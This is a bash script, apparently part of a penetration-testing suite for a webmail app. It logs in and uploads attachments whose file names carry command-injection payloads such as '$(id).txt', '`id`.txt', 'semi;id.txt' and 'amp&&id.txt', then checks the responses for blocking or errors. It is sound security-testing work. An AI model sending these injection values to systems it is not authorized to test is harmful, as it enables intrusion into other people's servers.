#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed cp
setup_run_dir "33-command-injection-attachment"

printf 'benign\n' > 'normal.txt'
printf 'benign\n' > '$(id).txt'
printf 'benign\n' > '`id`.txt'
printf 'benign\n' > 'semi;id.txt'
printf 'benign\n' > 'amp&&id.txt'

perform_login cookies.txt login.headers login.body.html
for fname in 'normal.txt' '$(id).txt' '`id`.txt' 'semi;id.txt' 'amp&&id.txt'; do
  label="$(printf '%s' "$fname" | tr -c 'A-Za-z0-9._-' '_')"
  fetch_get "${COMPOSE_PATH}" compose-pre.html compose-pre.headers cookies.txt
  csrf="$(extract_first_csrf compose-pre.html)"
  curl -sS -o "${label}.html" -D "${label}.headers" -b cookies.txt -c cookies.txt \
    -X POST "${TARGET_BASE_URL}${SEND_PATH}" \
    -H "Origin: ${TARGET_BASE_URL}" \
    -H "Referer: ${TARGET_BASE_URL}${COMPOSE_PATH}" \
    -F "csrf_token=${csrf}" \
    -F "to=${INVALID_EMAIL}" \
    -F "subject=command injection filename ${fname}" \
    -F 'body=command injection filename probe only' \
    -F "attachment=@${fname};type=text/plain"
  printf '\n===== %s =====\nhttp=%s\ntitle=%s\n' "$fname" "$(header_code "${label}.headers")" "$(html_title "${label}.html")"
  grep -Eoi 'invalid|request failed|compose|attachment|upload|forbidden|denied|blocked|mailboxes|login' "${label}.html" | sed -n '1,40p'
done

printf '\nSaved in %s\n' "$RUN_DIR"
